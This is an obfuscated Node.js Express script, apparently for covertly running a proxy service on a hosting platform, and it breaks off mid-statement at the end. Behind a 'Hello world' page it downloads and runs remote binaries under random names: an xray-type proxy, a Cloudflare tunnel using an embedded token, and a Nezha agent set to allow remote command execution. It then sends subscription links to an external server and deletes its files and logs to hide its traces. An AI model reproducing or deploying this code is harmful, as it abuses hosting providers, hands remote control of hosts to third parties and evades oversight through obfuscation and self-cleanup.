const _0x12d900=_0x216f;(function(_0x482bf7,_0x354ae3){const _0x32ad66=_0x216f,_0x31b963=_0x482bf7();while(!![]){try{const _0x3b882f=-parseInt(_0x32ad66(0x1e3))/0x1*(parseInt(_0x32ad66(0x22b))/0x2)+-parseInt(_0x32ad66(0x1f6))/0x3*(parseInt(_0x32ad66(0x256))/0x4)+parseInt(_0x32ad66(0x210))/0x5+-parseInt(_0x32ad66(0x260))/0x6+parseInt(_0x32ad66(0x277))/0x7+parseInt(_0x32ad66(0x25c))/0x8*(parseInt(_0x32ad66(0x20a))/0x9)+-parseInt(_0x32ad66(0x21d))/0xa*(-parseInt(_0x32ad66(0x1de))/0xb);if(_0x3b882f===_0x354ae3)break;else _0x31b963['push'](_0x31b963['shift']());}catch(_0x3c35b1){_0x31b963['push'](_0x31b963['shift']());}}}(_0x4180,0xa2714));const express=require('express'),app=express(),axios=require(_0x12d900(0x231)),os=require('os'),fs=require('fs'),path=require(_0x12d900(0x290)),{promisify}=require(_0x12d900(0x1d6)),exec=promisify(require(_0x12d900(0x250))[_0x12d900(0x27e)]),UPLOAD_URL=process.env.UPLOAD_URL||'',PROJECT_URL=process.env.PROJECT_URL||'',AUTO_ACCESS=process.env.AUTO_ACCESS||![],FILE_PATH=process.env.FILE_PATH||_0x12d900(0x243),SUB_PATH=process.env.SUB_PATH||_0x12d900(0x1e5),PORT=process.env.SERVER_PORT||process.env.PORT||0xbb8,UUID=process.env.UUID||_0x12d900(0x1ff),NEZHA_SERVER=process.env.NEZHA_SERVER||_0x12d900(0x1e7),NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',ARGO_DOMAIN=process.env.ARGO_DOMAIN||_0x12d900(0x23f),ARGO_AUTH=process.env.ARGO_AUTH||_0x12d900(0x28e),ARGO_PORT=process.env.ARGO_PORT||0x1f41,CFIP=process.env.CFIP||_0x12d900(0x269),CFPORT=process.env.CFPORT||0x1bb,NAME=process.env.NAME||_0x12d900(0x1e5);!fs['existsSync'](FILE_PATH)?(fs[_0x12d900(0x276)](FILE_PATH),console[_0x12d900(0x1f1)](FILE_PATH+_0x12d900(0x21b))):console[_0x12d900(0x1f1)](FILE_PATH+_0x12d900(0x1f2));function generateRandomName(){const _0x1a615a=_0x12d900,_0x4bfd43='abcdefghijklmnopqrstuvwxyz';let _0x56d50d='';for(let _0x52832e=0x0;_0x52832e<0x6;_0x52832e++){_0x56d50d+=_0x4bfd43[_0x1a615a(0x238)](Math[_0x1a615a(0x22a)](Math[_0x1a615a(0x20e)]()*_0x4bfd43[_0x1a615a(0x1d3)]));}return _0x56d50d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x12d900(0x1db)](FILE_PATH,npmName),phpPath=path[_0x12d900(0x1db)](FILE_PATH,phpName),webPath=path[_0x12d900(0x1db)](FILE_PATH,webName),botPath=path[_0x12d900(0x1db)](FILE_PATH,botName),subPath=path[_0x12d900(0x1db)](FILE_PATH,_0x12d900(0x1fd)),listPath=path[_0x12d900(0x1db)](FILE_PATH,'list.txt'),bootLogPath=path[_0x12d900(0x1db)](FILE_PATH,_0x12d900(0x1e2)),configPath=path[_0x12d900(0x1db)](FILE_PATH,_0x12d900(0x249));function deleteNodes(){const _0x2a705f=_0x12d900;try{if(!UPLOAD_URL)return;if(!fs[_0x2a705f(0x223)](subPath))return;let _0x3a4f20;try{_0x3a4f20=fs[_0x2a705f(0x1d2)](subPath,_0x2a705f(0x200));}catch{return null;}const _0x307073=Buffer[_0x2a705f(0x1d9)](_0x3a4f20,_0x2a705f(0x254))[_0x2a705f(0x265)](_0x2a705f(0x200)),_0x3167c5=_0x307073[_0x2a705f(0x22c)]('\x0a')[_0x2a705f(0x1e0)](_0x18d70c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2a705f(0x234)](_0x18d70c));if(_0x3167c5[_0x2a705f(0x1d3)]===0x0)return;return axios[_0x2a705f(0x282)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x2a705f(0x1fc)]({'nodes':_0x3167c5}),{'headers':{'Content-Type':_0x2a705f(0x28d)}})[_0x2a705f(0x232)](_0x1acffd=>{return null;}),null;}catch(_0x20efe6){return null;}}function cleanupOldFiles(){const _0x1611b8=_0x12d900;try{const _0x2425e8=fs['readdirSync'](FILE_PATH);_0x2425e8[_0x1611b8(0x1d7)](_0x4940a8=>{const _0x6ba0eb=_0x1611b8,_0x57ddf3=path['join'](FILE_PATH,_0x4940a8);try{const _0x457a5f=fs['statSync'](_0x57ddf3);_0x457a5f[_0x6ba0eb(0x227)]()&&fs[_0x6ba0eb(0x219)](_0x57ddf3);}catch(_0x3ce89d){}});}catch(_0x12ff32){}}function _0x216f(_0x568794,_0x2f5a1e){_0x568794=_0x568794-0x1d2;const _0x41809c=_0x4180();let _0x216f86=_0x41809c[_0x568794];return _0x216f86;}async function generateConfig(){const _0x1987e0=_0x12d900,_0x33d8e1={'log':{'access':_0x1987e0(0x208),'error':_0x1987e0(0x208),'loglevel':_0x1987e0(0x222)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1987e0(0x26d),'settings':{'clients':[{'id':UUID,'flow':_0x1987e0(0x1f8)}],'decryption':_0x1987e0(0x222),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x1987e0(0x212),'dest':0xbbc}]},'streamSettings':{'network':_0x1987e0(0x258)}},{'port':0xbb9,'listen':_0x1987e0(0x24a),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x1987e0(0x222)},'streamSettings':{'network':_0x1987e0(0x258),'security':_0x1987e0(0x222)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x1987e0(0x26d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1987e0(0x222)},'streamSettings':{'network':'ws','security':_0x1987e0(0x222),'wsSettings':{'path':_0x1987e0(0x252)}},'sniffing':{'enabled':!![],'destOverride':[_0x1987e0(0x1d5),_0x1987e0(0x292),_0x1987e0(0x284)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1987e0(0x24a),'protocol':_0x1987e0(0x220),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1987e0(0x1d5),_0x1987e0(0x292),_0x1987e0(0x284)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1987e0(0x24a),'protocol':_0x1987e0(0x21c),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1987e0(0x222),'wsSettings':{'path':_0x1987e0(0x212)}},'sniffing':{'enabled':!![],'destOverride':[_0x1987e0(0x1d5),_0x1987e0(0x292),_0x1987e0(0x284)],'metadataOnly':![]}}],'dns':{'servers':[_0x1987e0(0x1f0)]},'outbounds':[{'protocol':_0x1987e0(0x25b),'tag':_0x1987e0(0x27f)},{'protocol':_0x1987e0(0x1da),'tag':_0x1987e0(0x1e8)}]};fs['writeFileSync'](path['join'](FILE_PATH,'config.json'),JSON[_0x1987e0(0x1fc)](_0x33d8e1,null,0x2));}function getSystemArchitecture(){const _0xa114ac=_0x12d900,_0x1de90c=os[_0xa114ac(0x281)]();return _0x1de90c===_0xa114ac(0x280)||_0x1de90c===_0xa114ac(0x1f9)||_0x1de90c===_0xa114ac(0x1d8)?'arm':_0xa114ac(0x24f);}function downloadFile(_0x30c77f,_0x2fba7d,_0x12b292){const _0x444389=_0x12d900,_0x1f257c=_0x30c77f;!fs[_0x444389(0x223)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x1768e4=fs[_0x444389(0x261)](_0x1f257c);axios({'method':_0x444389(0x1ec),'url':_0x2fba7d,'responseType':_0x444389(0x26b)})[_0x444389(0x289)](_0x1c7e64=>{const _0x349360=_0x444389;_0x1c7e64['data']['pipe'](_0x1768e4),_0x1768e4['on'](_0x349360(0x264),()=>{const _0x23526b=_0x349360;_0x1768e4[_0x23526b(0x257)](),console[_0x23526b(0x1f1)](_0x23526b(0x203)+path[_0x23526b(0x246)](_0x1f257c)+_0x23526b(0x25d)),_0x12b292(null,_0x1f257c);}),_0x1768e4['on'](_0x349360(0x26a),_0x14c4e1=>{const _0x5557b4=_0x349360;fs[_0x5557b4(0x271)](_0x1f257c,()=>{});const _0x3142df='Download\x20'+path[_0x5557b4(0x246)](_0x1f257c)+_0x5557b4(0x1f7)+_0x14c4e1[_0x5557b4(0x1fb)];console[_0x5557b4(0x26a)](_0x3142df),_0x12b292(_0x3142df);});})[_0x444389(0x232)](_0x5f20f0=>{const _0x282294=_0x444389,_0x53b6a5=_0x282294(0x203)+path[_0x282294(0x246)](_0x1f257c)+_0x282294(0x1f7)+_0x5f20f0[_0x282294(0x1fb)];console['error'](_0x53b6a5),_0x12b292(_0x53b6a5);});}function _0x4180(){const _0x51863c=['Nodes\x20uploaded\x20successfully','Add\x20automatic\x20access\x20task\x20faild:\x20','https+local://8.8.8.8/dns-query','log','\x20already\x20exists','fileName','readFile','taskkill\x20/f\x20/im\x20','7218KCbtCt','\x20failed:\x20','xtls-rprx-vision','arm64','send','message','stringify','sub.txt','platform','9afd1229-b893-40c1-84dd-51e7ce204913','utf-8','index.html','del\x20/f\x20/q\x20','Download\x20','status','&path=%2Fvless-argo%3Fed%3D2560#','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0a\x20\x20credentials-file:\x20','/dev/null','?encryption=none&security=tls&sni=','27RWUidN','&fp=firefox&type=ws&host=','TunnelSecret','response','random','writeFileSync','5162960uQLzmc','\x0a\x20\x20tunnel:\x20','/trojan-argo','https://amd64.ssss.nyc.mn/bot','isp','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','/api/add-subscriptions','https://amd64.ssss.nyc.mn/web','auto','unlinkSync','Error\x20reading\x20boot.log:','\x20is\x20created','trojan','40WYQptb','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','chmod','vmess','org','none','existsSync','true','2053','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','isFile','https://arm64.ssss.nyc.mn/v1','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','floor','142Ahlcuc','split','firefox','Error\x20in\x20startserver:','2096','tunnel.yml','axios','catch','Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!','test','\x20>/dev/null\x202>&1','https://oooo.serv00.net/add-url','/config.json\x20>/dev/null\x202>&1\x20&','charAt','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20-p\x20','php\x20running\x20error:\x20','\x0a\x0avmess://','Mozilla/5.0','443','yanshi.b.1.8.0.9.1.0.0.0.7.4.0.1.0.0.2.ip6.arpa','pkill\x20-f\x20\x22[','Empowerment\x20success\x20for\x20','\x20is\x20running','.tmp','text/plain;\x20charset=utf-8','listen','basename','includes','map','config.json','127.0.0.1','Skipping\x20adding\x20automatic\x20access\x20task','App\x20is\x20running','config.yaml','success','amd','child_process','\x20-s\x20','/vless-argo','Error\x20executing\x20command:\x20','base64','\x20-c\x20\x22','1864UkPaIU','close','tcp','--tls','false','freedom','2393248cnHHRv','\x20successfully','NEZHA\x20variable\x20is\x20empty,skip\x20running','clear','4193988aZWhAF','createWriteStream','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','npm\x20running\x20error:\x20','finish','toString','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','match','replace','saas.sin.fan','error','stream','/api/add-nodes','vless','has','Subscription\x20uploaded\x20successfully','substring','unlink','\x20>\x20nul\x202>&1','utf8','https://amd64.ssss.nyc.mn/agent','ARGO_DOMAIN:','mkdirSync','3419997tOEyYV','set','Empowerment\x20failed\x20for\x20','\x0avless://','\x0a\x20\x20\x20\x20','push','\x22\x20>\x20/dev/null\x202>&1','exec','direct','arm','arch','post','promises','quic','Error\x20downloading\x20files:','data','win32','all','then','\x0aclient_secret:\x20','\x0a\x0atrojan://','http://ip-api.com/json','application/json','eyJhIjoiNzRkZmQ0MmIwMGYxZGM0NTNiOWNiMzE3NWIwNDQ5Y2YiLCJ0IjoiZWIwY2QwYTYtMWIwMy00Y2EzLTk0NGEtNTcwMWNlMGQxZTFlIiwicyI6IlpUVTBPR0UxWlRjdFpURmlaQzAwWVRRNUxXSmhPVFV0T0Rjek5ERTJOVGsyWm1ObSJ9','https://amd64.ssss.nyc.mn/v1','path','\x20-c\x20','tls','country_code','pop','nohup\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://api.ip.sb/geoip','readFileSync','length','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','http','util','forEach','aarch64','from','blackhole','join','tunnel.json','unshift','2005927FZUAsK','web\x20running\x20error:\x20','filter','2087','boot.log','9331CqdZgv','.exe\x20>\x20nul\x202>&1','sub','Unknown','80a727eb-b865-467a-b99f-0bc8ba3d1cda','block','\x20>/dev/null\x202>&1\x20&','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','get','fileUrl'];_0x4180=function(){return _0x51863c;};return _0x4180();}async function downloadFilesAndRun(){const _0x5b1c05=_0x12d900,_0x178ab5=getSystemArchitecture(),_0x55cba9=getFilesForArchitecture(_0x178ab5);if(_0x55cba9[_0x5b1c05(0x1d3)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x39392b=_0x55cba9[_0x5b1c05(0x248)](_0x4e693f=>{return new Promise((_0x3cd16d,_0x1763f2)=>{const _0x4f699a=_0x216f;downloadFile(_0x4e693f[_0x4f699a(0x1f3)],_0x4e693f[_0x4f699a(0x1ed)],(_0x5a43e2,_0x3428ee)=>{_0x5a43e2?_0x1763f2(_0x5a43e2):_0x3cd16d(_0x3428ee);});});});try{await Promise[_0x5b1c05(0x288)](_0x39392b);}catch(_0x394c4d){console[_0x5b1c05(0x26a)](_0x5b1c05(0x285),_0x394c4d);return;}function _0x4bfd74(_0x35fe02){const _0x296467=_0x5b1c05,_0x496cde=0x1fd;_0x35fe02[_0x296467(0x1d7)](_0x13c4e3=>{const _0x93103e=_0x296467;fs['existsSync'](_0x13c4e3)&&fs[_0x93103e(0x21f)](_0x13c4e3,_0x496cde,_0x1f2de0=>{const _0x1ff69f=_0x93103e;_0x1f2de0?console[_0x1ff69f(0x26a)](_0x1ff69f(0x279)+_0x13c4e3+':\x20'+_0x1f2de0):console[_0x1ff69f(0x1f1)](_0x1ff69f(0x241)+_0x13c4e3+':\x20'+_0x496cde[_0x1ff69f(0x265)](0x8));});});}const _0x3ccef8=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4bfd74(_0x3ccef8);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3eb61e=NEZHA_SERVER[_0x5b1c05(0x247)](':')?NEZHA_SERVER[_0x5b1c05(0x22c)](':')[_0x5b1c05(0x294)]():'',_0x14d4c1=new Set(['443','8443',_0x5b1c05(0x22f),_0x5b1c05(0x1e1),'2083','2053']),_0x37705e=_0x14d4c1[_0x5b1c05(0x26e)](_0x3eb61e)?_0x5b1c05(0x224):_0x5b1c05(0x25a),_0xfe47f4=_0x5b1c05(0x28a)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x5b1c05(0x296)+_0x37705e+_0x5b1c05(0x206)+UUID;fs['writeFileSync'](path[_0x5b1c05(0x1db)](FILE_PATH,_0x5b1c05(0x24d)),_0xfe47f4);const _0x3f9f90='nohup\x20'+phpPath+_0x5b1c05(0x255)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3f9f90),console[_0x5b1c05(0x1f1)](phpName+_0x5b1c05(0x242)),await new Promise(_0x5ce659=>setTimeout(_0x5ce659,0x3e8));}catch(_0x5e7cb1){console[_0x5b1c05(0x26a)](_0x5b1c05(0x23b)+_0x5e7cb1);}}else{let _0x550f8f='';const _0x2c919f=[_0x5b1c05(0x23e),'8443',_0x5b1c05(0x22f),'2087','2083',_0x5b1c05(0x225)];_0x2c919f['includes'](NEZHA_PORT)&&(_0x550f8f=_0x5b1c05(0x259));const _0x33071f='nohup\x20'+npmPath+_0x5b1c05(0x251)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5b1c05(0x23a)+NEZHA_KEY+'\x20'+_0x550f8f+_0x5b1c05(0x262);try{await exec(_0x33071f),console[_0x5b1c05(0x1f1)](npmName+'\x20is\x20running'),await new Promise(_0x1671d4=>setTimeout(_0x1671d4,0x3e8));}catch(_0x49606f){console[_0x5b1c05(0x26a)](_0x5b1c05(0x263)+_0x49606f);}}}else console[_0x5b1c05(0x1f1)](_0x5b1c05(0x25e));const _0x417c31=_0x5b1c05(0x295)+webPath+_0x5b1c05(0x291)+FILE_PATH+_0x5b1c05(0x237);try{await exec(_0x417c31),console['log'](webName+'\x20is\x20running'),await new Promise(_0x2d9298=>setTimeout(_0x2d9298,0x3e8));}catch(_0x55fc24){console['error'](_0x5b1c05(0x1df)+_0x55fc24);}if(fs[_0x5b1c05(0x223)](botPath)){let _0x5ef11f;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x5ef11f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x5b1c05(0x267)](/TunnelSecret/)?_0x5ef11f=_0x5b1c05(0x215)+FILE_PATH+'/tunnel.yml\x20run':_0x5ef11f=_0x5b1c05(0x21e)+FILE_PATH+_0x5b1c05(0x1ea)+ARGO_PORT;try{await exec(_0x5b1c05(0x295)+botPath+'\x20'+_0x5ef11f+_0x5b1c05(0x1e9)),console[_0x5b1c05(0x1f1)](botName+_0x5b1c05(0x242)),await new Promise(_0x11d3ed=>setTimeout(_0x11d3ed,0x7d0));}catch(_0x230307){console['error'](_0x5b1c05(0x253)+_0x230307);}}await new Promise(_0x1c7138=>setTimeout(_0x1c7138,0x1388));}function getFilesForArchitecture(_0x5201bc){const _0x3735aa=_0x12d900;let _0x366537;_0x5201bc===_0x3735aa(0x280)?_0x366537=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x366537=[{'fileName':webPath,'fileUrl':_0x3735aa(0x217)},{'fileName':botPath,'fileUrl':_0x3735aa(0x213)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4a466d=_0x5201bc===_0x3735aa(0x280)?'https://arm64.ssss.nyc.mn/agent':_0x3735aa(0x274);_0x366537[_0x3735aa(0x1dd)]({'fileName':npmPath,'fileUrl':_0x4a466d});}else{const _0x141dc1=_0x5201bc==='arm'?_0x3735aa(0x228):_0x3735aa(0x28f);_0x366537[_0x3735aa(0x1dd)]({'fileName':phpPath,'fileUrl':_0x141dc1});}}return _0x366537;}function argoType(){const _0xaaeb83=_0x12d900;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xaaeb83(0x1f1)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes'](_0xaaeb83(0x20c))){fs[_0xaaeb83(0x20f)](path[_0xaaeb83(0x1db)](FILE_PATH,_0xaaeb83(0x1dc)),ARGO_AUTH);const _0x14c6ff=_0xaaeb83(0x211)+ARGO_AUTH[_0xaaeb83(0x22c)]('\x22')[0xb]+_0xaaeb83(0x207)+path[_0xaaeb83(0x1db)](FILE_PATH,_0xaaeb83(0x1dc))+_0xaaeb83(0x1d4)+ARGO_DOMAIN+_0xaaeb83(0x229)+ARGO_PORT+_0xaaeb83(0x226);fs[_0xaaeb83(0x20f)](path[_0xaaeb83(0x1db)](FILE_PATH,_0xaaeb83(0x230)),_0x14c6ff);}else console['log'](_0xaaeb83(0x1eb));}async function extractDomains(){const _0x5c1dfb=_0x12d900;let _0xf2c216;if(ARGO_AUTH&&ARGO_DOMAIN)_0xf2c216=ARGO_DOMAIN,console[_0x5c1dfb(0x1f1)](_0x5c1dfb(0x275),_0xf2c216),await _0x223268(_0xf2c216);else try{const _0x48ee66=fs[_0x5c1dfb(0x1d2)](path[_0x5c1dfb(0x1db)](FILE_PATH,_0x5c1dfb(0x1e2)),'utf-8'),_0x3f1386=_0x48ee66[_0x5c1dfb(0x22c)]('\x0a'),_0x2d564c=[];_0x3f1386['forEach'](_0x2479dd=>{const _0x522cd8=_0x5c1dfb,_0xf6f68a=_0x2479dd[_0x522cd8(0x267)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xf6f68a){const _0x1b2b42=_0xf6f68a[0x1];_0x2d564c['push'](_0x1b2b42);}});if(_0x2d564c['length']>0x0)_0xf2c216=_0x2d564c[0x0],console['log']('ArgoDomain:',_0xf2c216),await _0x223268(_0xf2c216);else{console[_0x5c1dfb(0x1f1)](_0x5c1dfb(0x239)),fs[_0x5c1dfb(0x219)](path[_0x5c1dfb(0x1db)](FILE_PATH,'boot.log'));async function _0x5924e6(){const _0x37de4c=_0x5c1dfb;try{process[_0x37de4c(0x1fe)]===_0x37de4c(0x287)?await exec(_0x37de4c(0x1f5)+botName+_0x37de4c(0x1e4)):await exec(_0x37de4c(0x240)+botName[_0x37de4c(0x238)](0x0)+']'+botName[_0x37de4c(0x270)](0x1)+_0x37de4c(0x27d));}catch(_0x59fe9f){}}_0x5924e6(),await new Promise(_0x5e4255=>setTimeout(_0x5e4255,0xbb8));const _0x44b343=_0x5c1dfb(0x21e)+FILE_PATH+_0x5c1dfb(0x1ea)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x44b343+_0x5c1dfb(0x1e9)),console[_0x5c1dfb(0x1f1)](botName+_0x5c1dfb(0x242)),await new Promise(_0xd02187=>setTimeout(_0xd02187,0xbb8)),await extractDomains();}catch(_0x37d9d6){console[_0x5c1dfb(0x26a)](_0x5c1dfb(0x253)+_0x37d9d6);}}}catch(_0x2a58b7){console[_0x5c1dfb(0x26a)](_0x5c1dfb(0x21a),_0x2a58b7);}async function _0x37196f(){const _0x22b1d9=_0x5c1dfb;try{const _0x47b317=await axios['get'](_0x22b1d9(0x297),{'headers':{'User-Agent':_0x22b1d9(0x23d),'timeout':0xbb8}});if(_0x47b317['data']&&_0x47b317[_0x22b1d9(0x286)]['country_code']&&_0x47b317['data'][_0x22b1d9(0x214)])return(_0x47b317['data'][_0x22b1d9(0x293)]+'-'+_0x47b317[_0x22b1d9(0x286)]['isp'])[_0x22b1d9(0x268)](/\s+/g,'_');}catch(_0x2e5aaf){try{const _0x27664c=await axios[_0x22b1d9(0x1ec)](_0x22b1d9(0x28c),{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}});if(_0x27664c[_0x22b1d9(0x286)]&&_0x27664c[_0x22b1d9(0x286)][_0x22b1d9(0x204)]===_0x22b1d9(0x24e)&&_0x27664c[_0x22b1d9(0x286)]['countryCode']&&_0x27664c[_0x22b1d9(0x286)][_0x22b1d9(0x221)])return(_0x27664c[_0x22b1d9(0x286)]['countryCode']+'-'+_0x27664c[_0x22b1d9(0x286)]['org'])[_0x22b1d9(0x268)](/\s+/g,'_');}catch(_0x1f9bc1){}}return _0x22b1d9(0x1e6);}async function _0x223268(_0x55173a){const _0x298e3d=await _0x37196f(),_0x1e529a=NAME?NAME+'-'+_0x298e3d:_0x298e3d;return new Promise(_0x1010b6=>{setTimeout(()=>{const _0x2cda2c=_0x216f,_0x46da35={'v':'2','ps':''+_0x1e529a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2cda2c(0x218),'net':'ws','type':_0x2cda2c(0x222),'host':_0x55173a,'path':'/vmess-argo?ed=2560','tls':_0x2cda2c(0x292),'sni':_0x55173a,'alpn':'','fp':_0x2cda2c(0x22d)},_0x7fbe49=_0x2cda2c(0x27a)+UUID+'@'+CFIP+':'+CFPORT+_0x2cda2c(0x209)+_0x55173a+_0x2cda2c(0x20b)+_0x55173a+_0x2cda2c(0x205)+_0x1e529a+_0x2cda2c(0x23c)+Buffer['from'](JSON[_0x2cda2c(0x1fc)](_0x46da35))[_0x2cda2c(0x265)](_0x2cda2c(0x254))+_0x2cda2c(0x28b)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x55173a+_0x2cda2c(0x20b)+_0x55173a+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x1e529a+_0x2cda2c(0x27b);console['log'](Buffer[_0x2cda2c(0x1d9)](_0x7fbe49)[_0x2cda2c(0x265)](_0x2cda2c(0x254))),fs[_0x2cda2c(0x20f)](subPath,Buffer[_0x2cda2c(0x1d9)](_0x7fbe49)[_0x2cda2c(0x265)](_0x2cda2c(0x254))),console[_0x2cda2c(0x1f1)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x2225cb,_0x423ce8)=>{const _0x15e0ca=_0x2cda2c,_0x2d8d1f=Buffer[_0x15e0ca(0x1d9)](_0x7fbe49)[_0x15e0ca(0x265)](_0x15e0ca(0x254));_0x423ce8[_0x15e0ca(0x278)]('Content-Type',_0x15e0ca(0x244)),_0x423ce8[_0x15e0ca(0x1fa)](_0x2d8d1f);}),_0x1010b6(_0x7fbe49);},0x7d0);});}}async function uploadNodes(){const _0x2c5573=_0x12d900;if(UPLOAD_URL&&PROJECT_URL){const _0x39c97b=PROJECT_URL+'/'+SUB_PATH,_0x578eb1={'subscription':[_0x39c97b]};try{const _0xa6353a=await axios['post'](UPLOAD_URL+_0x2c5573(0x216),_0x578eb1,{'headers':{'Content-Type':'application/json'}});return _0xa6353a&&_0xa6353a['status']===0xc8?(console['log'](_0x2c5573(0x26f)),_0xa6353a):null;}catch(_0x23aed7){if(_0x23aed7[_0x2c5573(0x20d)]){if(_0x23aed7[_0x2c5573(0x20d)][_0x2c5573(0x204)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x472715=fs[_0x2c5573(0x1d2)](listPath,_0x2c5573(0x200)),_0x1c653d=_0x472715[_0x2c5573(0x22c)]('\x0a')['filter'](_0x5324cf=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2c5573(0x234)](_0x5324cf));if(_0x1c653d[_0x2c5573(0x1d3)]===0x0)return;const _0x3e06fe=JSON['stringify']({'nodes':_0x1c653d});try{const _0x9316ee=await axios[_0x2c5573(0x282)](UPLOAD_URL+_0x2c5573(0x26c),_0x3e06fe,{'headers':{'Content-Type':_0x2c5573(0x28d)}});return _0x9316ee&&_0x9316ee['status']===0xc8?(console[_0x2c5573(0x1f1)](_0x2c5573(0x1ee)),_0x9316ee):null;}catch(_0x2e2cee){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x6611b7=_0x216f,_0x430744=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x430744[_0x6611b7(0x27c)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x430744[_0x6611b7(0x27c)](phpPath);process['platform']===_0x6611b7(0x287)?exec(_0x6611b7(0x202)+_0x430744[_0x6611b7(0x1db)]('\x20')+_0x6611b7(0x272),_0x3c589b=>{const _0x2af220=_0x6611b7;console[_0x2af220(0x25f)](),console[_0x2af220(0x1f1)]('App\x20is\x20running'),console[_0x2af220(0x1f1)](_0x2af220(0x266));}):exec('rm\x20-rf\x20'+_0x430744[_0x6611b7(0x1db)]('\x20')+_0x6611b7(0x235),_0x1d793c=>{const _0x597d15=_0x6611b7;console[_0x597d15(0x25f)](),console['log'](_0x597d15(0x24c)),console[_0x597d15(0x1f1)](_0x597d15(0x266));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xd917c9=_0x12d900;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xd917c9(0x1f1)](_0xd917c9(0x24b));return;}try{const _0x3b9ca1=await axios[_0xd917c9(0x282)](_0xd917c9(0x236),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xd917c9(0x28d)}});return console[_0xd917c9(0x1f1)]('automatic\x20access\x20task\x20added\x20successfully'),_0x3b9ca1;}catch(_0x17f796){return console['error'](_0xd917c9(0x1ef)+_0x17f796[_0xd917c9(0x1fb)]),null;}}async function startserver(){const _0x12e610=_0x12d900;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x405d31){console[_0x12e610(0x26a)](_0x12e610(0x22e),_0x405d31);}}startserver()[_0x12d900(0x232)](_0x41ec10=>{const 